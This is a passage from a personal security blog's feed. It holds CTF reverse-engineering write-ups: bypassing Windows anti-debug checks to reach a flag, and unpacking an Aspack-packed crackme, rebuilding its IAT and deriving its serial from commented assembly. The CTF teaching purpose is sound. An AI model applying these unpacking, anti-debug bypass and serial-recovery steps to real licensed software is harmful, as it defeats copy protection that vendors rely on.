src="http://3.bp.blogspot.com/-zmS1A6GK5pg/VTF_kk4fhyI/AAAAAAAAAEY/f0w4KWhRkWo/s1600/Capture.PNG" alt="alt">\n\nAt first , It gets the PEB (Process Environment Block) structure as it contains a value that indicates whether the binary is being debugged or not .\nWe can simply bypass it by setting EAX value to zero . So let's carry on and see the next anti-debug trick .\n\n<img src="http://2.bp.blogspot.com/-_Z_1FnFdJnU/VTGBTyV5NwI/AAAAAAAAAEk/B5l9RquZbjo/s1600/Capture.PNG" alt="alt">\nAfter stepping out some instructions , I figured out that it does a manual import of &quot;NtqueryInformationProcess&quot; API  with the help of LoadLibrary and GetProcAdress api's .\n Well , a well trained eye will know that these consecutive calls is an indication of an anti-debug mechanism that will set SYSTEM_INFORMATION_CLASS parameter to ProcessDebugPort value.\nOnce again , just change the value of EAX in order to get over it .\n\n<img src="http://3.bp.blogspot.com/-SRW_8keGepc/VTGFb1rX_hI/AAAAAAAAAEw/i8GON6fKMqc/s1600/Capture.PNG" alt="alt">\nThis is yet another anti-debug technique was made . It obtains the value of NtglobalFlag by getting    the PEB through TIB(Thread Information Block ).\n\n   After reaching the code section we will see a bunch of CALL instructions  was created for   obfuscation puposes , one of them is really interesting (0x00401070) which seems to print a string  with a xor-decryption loop .\n<img src="http://4.bp.blogspot.com/-V9aSTxnXKAg/VTGKXAGGKVI/AAAAAAAAAFA/NOfy3jyDTQk/s1600/Capture.PNG" alt="alt">\n\nHaving executed that function , 0x004010C0 routine displayed  the Flag .\n<img src="http://1.bp.blogspot.com/-Vu0kTB59cl0/VTGL6T6tJwI/AAAAAAAAAFM/8vVAwcaSNjY/s1600/Capture.PNG" alt="alt">\n\n\n\n<mark>FLAG is</mark> : &quot;<a href="http://forensic-proof.com/archives/552">http://forensic-proof.com/archives/552</a>&quot; .\n\n</p>
+<!--kg-card-end: markdown-->]]></content:encoded></item><item><title><![CDATA[CTF Sharif Writeup for ReverseMe 250pts]]></title><description><![CDATA[<!--kg-card-begin: markdown--><p>Today we are going to be talking about how to solve the reverse_me of Sharif CTF .Well , to begin with, I would like to give special thanks to whoever contributed to the CTF for their time devoted in creating such great tasks .\n\nSo, let's start with most common</p>]]></description><link>http://localhost:2368/ctf-sharif-writeup-for-reverseme-250pts/</link><guid isPermaLink="false">5d4266af78f05e1d88fb4031</guid><dc:creator><![CDATA[mohamed ali MRABET]]></dc:creator><pubDate>Thu, 01 Aug 2019 04:13:23 GMT</pubDate><content:encoded><![CDATA[<!--kg-card-begin: markdown--><p>Today we are going to be talking about how to solve the reverse_me of Sharif CTF .Well , to begin with, I would like to give special thanks to whoever contributed to the CTF for their time devoted in creating such great tasks .\n\nSo, let's start with most common step which a reverse engineer is accustomed to begging with :\n\nLet's scan it with peid :\n\n<img src="http://3.bp.blogspot.com/-_h-2weINT00/VCcOFJoALuI/AAAAAAAAABo/DEqDeAaV4x4/s1600/Capture.PNG" alt="alt">\n\nAs one can see , the binary  is packed with Aspack 2.12 .\n\n#Unpacking the target : \nBefore proceeding , we load the executable into olly , and the first instruction we are going to see  is 'pushad' , just step over it (f8) , then follow ESP in dump  and make a hardware breakpoint on the first 4 bytes :\n<img src="http://2.bp.blogspot.com/-SyrkjfO3KrY/VCcRgrAy_XI/AAAAAAAAAB0/Zv093yPd7zs/s1600/Capture.PNG" alt="alt">\nThen run it (F9) and you will see the following :\n\n<img src="http://4.bp.blogspot.com/-znf47OJcYiE/VCcVa4C-EnI/AAAAAAAAACA/avG_3U-Qt2Y/s1600/Capture1.PNG" alt="alt">\n\nWell , simply put , the packer obviously uses the PUSH followed by the RETN instruction to land at the OEP which is at adress 004016BB .\nOnce you are there , you will notice some obfuscated code that was deliberatley obfuscated by the packer in order to fool the cracker ,  that's where the plugin 'Analyze This!' comes handy .\nIt's purpose is to convert raw data into assembly instructions , so right click and and click on 'Analyze This!' : \n<img src="http://3.bp.blogspot.com/-6Ce4WAfMbCM/VCe2WzFAaxI/AAAAAAAAACQ/IvL4EhEAapk/s1600/Capture2.PNG" alt="alt">\n\nNow ,we have comprehensible machine instructions ,let's use &quot;Dump debugged process&quot; plugin which it's sole intention is to dump active debuggee process , so the very first thing you are going to need is to  copy the value in 'modify' section into the clipboard and then click 'Dump' and save it as 'ReverseMe2' \n\n<img src="http://3.bp.blogspot.com/-6yL8_BXgstE/VCe7lVh1MsI/AAAAAAAAACg/Xk4HUnijG6k/s1600/Capture3.PNG" alt="alt">\n\nInevitably ,since the binary is packed, then it comes as no surprise  that the IAT table is destroyed ,so in order to circumvent this ,we have to rebuild the IAT with 'IMPrec tool' .\n\nso , run ' IMPrec&quot; and then select the process of &quot;ReverseMe&quot; from the running process list and past the value that we have copied  previously  into the 'OEP' of IMPrec and click on 'IAT AutoSearch'  and then on'Get Imports ',  finally click on 'Fix dump' and select the executable &quot;ReversMe2.exe&quot; and it will be saved as &quot;ReversMe2_.exe&quot;\n<img src="http://1.bp.blogspot.com/-0pXMSo8_tLg/VCfD6yw8LEI/AAAAAAAAACw/-oiKVZU72ZQ/s1600/Capture4.PNG" alt="alt">\n\nThe important thing is that during these steps you have to be very careful ,otherwise the entire thing does not work . \n#Finding  the Flag \n\nAfter unpacking the binary ,now we are ready to reverse engineer it ,so load the &quot;ReverseMe2_.exe&quot;into olly and select   &quot;search for -&gt;all intermodular calls&quot; then right click on &quot;getdigitemtextA&quot; API and click on &quot;set breakpoint on every call to getdigitemtextA&quot; and run the program (F9) : \n<img src="http://4.bp.blogspot.com/-nsF1-zntuu4/VCfJTkyigRI/AAAAAAAAADA/VZFuQ53JvUs/s1600/Capture5.PNG" alt="alt">\n\nhere , just put an email address and serial number and click on &quot;OK&quot;,and you will hit the breakpoint on the first &quot;getdigItextitem&quot; api  just step over them .\n<code>\nLEA EAX,DWORD PTR SS:[EBP-340] ; loads eax with memory address of the email   \nPUSH r_.0040FD0C ;push the memory address of '@' charchter \nPUSH EAX ;push memory address of the email  \nCALL r_.004013A0 ; this routine checks to see whether email string contains '@'or not ,\nADD ESP,8 ; removes the addresses of email and '@' from the stack  \nTEST EAX,EAX ; checks the return value of the previous routine  \nJE SHORT r_.00401144 ; jumps if eax contains 0 \nLEA EAX,DWORD PTR SS:[EBP-340] ;  loads eax with memory address of the email \nPUSH r_.0040FD34 ; push the memory address of '.' charchter \nPUSH EAX ; push memory address of the email  \nCALL r_.004013A0 ; this routine checks to see whether '@blabla.tn 'string contains '.'or not \nADD ESP,8 ;removes the addresses of '@blabla.tn 'string and '.' from the stack \nTEST EAX,EAX ; checks the return value of the previous routine \nJE SHORT r_.00401144 ;jumps if eax contains 0 \nLEA EAX,DWORD PTR SS:[EBP-340];loads eax with memory address of the email \nPUSH r_.0040FD34 ;push the memory address of '.' charchter\nPUSH EAX ;push memory address of the email  \nCALL r_.004013A0 ; the same routine previously called \nADD ESP,8 ;removes the addresses of '@blabla.tn 'string and '.' from the stack\nCMP BYTE PTR DS:[EAX+1],0;compares the first char after the '.' with 0  \nJE SHORT r_.00401144 ;jumps if nothing after the point charachter \n LEA EAX,DWORD PTR SS:[EBP-340] ; loads eax with memory address of the email \n PUSH r_.0040FD0C; push the memory address of '@' charchter \n PUSH EAX ;push memory address of the email\nCALL r_.004013A0 ; this routine checks to see whether email string contains '@'or not\nADD ESP,8\n CMP BYTE PTR DS:[EAX+1],2E ; compares the char after '@' with the '.'char\n JNZ SHORT r_.0040114E ; else jump to serial checking routine \n PUSH r_.0040FD10                               ;  ASCII \&quot;Your E-mail address in not valid.\&quot;\nJMP r_.004012A5  ; jump to nag \nMOVQ MM0,QWORD PTR DS:[40FD70] ; loads MM0 with adress of \&quot;registration fail\&quot;\n   LEA ECX,DWORD PTR SS:[EBP-240] : loads ECX with the our serial  \nMOV AL,BYTE PTR DS:[ECX] ; moves the byte which  ecx is pointing to , to AL\n  INC ECX                                ;  r_.0040FD0D increments the address that ECX contains\nTEST AL,AL ;  checks whether AL contains 0 or not \n JNZ SHORT r_.00401192 ; if not  jump back and increment ECX \nSUB ECX,EDX ; subtract ecx from edx \nCMP ECX,10 ;checks the length of the serial \nJNZ r_.004012A1 jump to nag if the length is not 16\nCMP BYTE PTR SS:[EBP-240],42 ; compare the first char with 'B'\nJNZ r_.004012A1 : if not equal jump to nag \n MOVSX EAX,BYTE PTR SS:[EBP-231] ; moves the last char of the entered serial  to EAX\n \nADD EAX,42 ; adds eax with 42 \nCMP EAX,9B  ;  and cmp it with 9b ,so the last char should be 9B - 42 = 59 which is 'Y'\nJNZ r_.004012A1 else jump to nag \n \nMOVSX ECX,BYTE PTR SS:[EBP-23F] ; it loads the second char\nLEA EAX,DWORD PTR DS:[ECX-3] ; loads eax with ord(second char) - 3\n CMP EAX,57 ;cmp it 57 ,that means the second char should be 57 + 3 = 5A which is 'Z'\nJNZ r_.004012A1 else jump to nag \nMOVSX EAX,BYTE PTR SS:[EBP-232] ; loads the 15h to eax char\nADD EAX,ECX   ;  adds eax with 5A\nCMP EAX,9B ; the 15 element should be 9b - 5A = 41 the char is 'A'\nJNZ r_.004012A1 else jump to nag \nMOVSX ECX,BYTE PTR SS:[EBP-23E] ; load the 3rd char\n LEA EAX,DWORD PTR DS:[ECX+1] ;  ord(3rd char)+1\nCMP EAX,3A ; 3 rd char is 39 = '9'\nJNZ r_.004012A1 else jump \nMOVSX EAX,BYTE PTR SS:[EBP-233] load the 14th char\nADD EAX,ECX ;\n CMP EAX,9B ; the 14th char is 62h = 'b'\nJNZ r_.004012A1 else jump to nag \nCMP BYTE PTR SS:[EBP-23D],64 ;  the 4th char is 'd'\nJNZ r_.004012A1 else jump \n MOVSX EAX,BYTE PTR SS:[EBP-234] ; loads the 13 char\n ADD EAX,64\n CMP EAX,9B ; the 13 th char is 37h = '7'\nJNZ SHORT r_.004012A1 else jump to nag \nCMP BYTE PTR SS:[EBP-23C],6D ; the 5th char is  'm'\nJNZ SHORT r_.004012A1 else jump to nag \nMOVSX EAX,BYTE PTR SS:[EBP-235] ; loads eax with 12th char\nADD EAX,81\nCMP EAX,0C8 ; 12th char is c8 - 81 = 47h ..'G'\nJNZ SHORT r_.004012A1 ; nag \n MOVSX ECX,BYTE PTR SS:[EBP-23B] ; loads the 6th char\nLEA EAX,DWORD PTR DS:[ECX-2D]  ; \nCMP EAX,44 ; the 6th char should be 44 + 2d = 71 = 'q'\n JNZ SHORT r_.004012A1 else jump nag \nMOVSX EAX,BYTE PTR SS:[EBP-236] ; the 11th char\n ADD EAX,ECX                                    ;  r_.0040FD0D\nCMP EAX,0AA  ;the 11char is AA - 71 = 39h = '9'\nJNZ SHORT r_.004012A1 ; nag \nCMP BYTE PTR SS:[EBP-23A],34 ; the 7th char is '4'\nJNZ SHORT r_.004012A1 ;nag\nMOVSX EAX,BYTE PTR SS:[EBP-237] ; loads the 10th char\nADD EAX,34\nCMP EAX,9B ; 10th char is 9b - 34 = 67h = 'g'\nJNZ SHORT r_.004012A1 ;nag\nCMP BYTE PTR SS:[EBP-239],63 ;the 8th char is 'c'\n JNZ SHORT r_.004012A1 ;nag\nMOVSX EAX,BYTE PTR SS:[EBP-238] ; the \n ADD EAX,63\nCMP EAX,9B ; the 9th char is 9b - 63 = 38h = '8'\n \n JE SHORT r_.004012BB ; get past the nag screen \n</code>\nWell , after putting the chararcters in order ,the serial should be like this : == = 'BZ9dmq4c8g9G7bAY' ==\n<img src="http://3.bp.blogspot.com/-4WNqCIDsoVg/VCfoCw1U1nI/AAAAAAAAADQ/asxo9Wd_9-A/s1600/Capture6.PNG" alt="alt">\n\n That's it basically , the reverseme is very simple , the serial checking routine ain't that  complicated , it is something that is learnt with time as  you practice with machine instructions .\n\nSo I am expecting your valuable feedback and suggestions for betterment . \n</p>
+<!--kg-card-end: markdown-->]]></content:encoded></item><item><title><![CDATA[About me]]></title><description><![CDATA[<!--kg-card-begin: markdown--><p>I am Mohamed Ali Mrabet , I'm graduated software engineer from Université du Québec à Montréal  <em>(UQAM)</em> . In this blog , I put together my projects and technical stuff that I am passionate about in the security scene , and also as a major source of motivation to expand my knowledge on computer</p>]]></description><link>http://localhost:2368/about-me/</link><guid isPermaLink="false">5d4263a778f05e1d88fb4017</guid><dc:creator><![CDATA[mohamed ali MRABET]]></dc:creator><pubDate>Thu, 01 Aug 2019 03:59:47 GMT</pubDate><content:encoded><![CDATA[<!--kg-card-begin: markdown--><p>I am Mohamed Ali Mrabet , I'm graduated software engineer from Université du Québec à Montréal  <em>(UQAM)</em> . In this blog , I put together my projects and technical stuff that I am passionate about in the security scene , and also as a major source of motivation to expand my knowledge on computer hacker subculture. My Primary area of focus is <em>Reverse engineering , Exploitation , Malware Analysis , Programming</em>.<br>
+I dedicate this bog to my mom as she always wanted me to be raised as an educated person .</p>
+<!--kg-card-end: markdown-->]]></content:encoded></item></channel></rss>
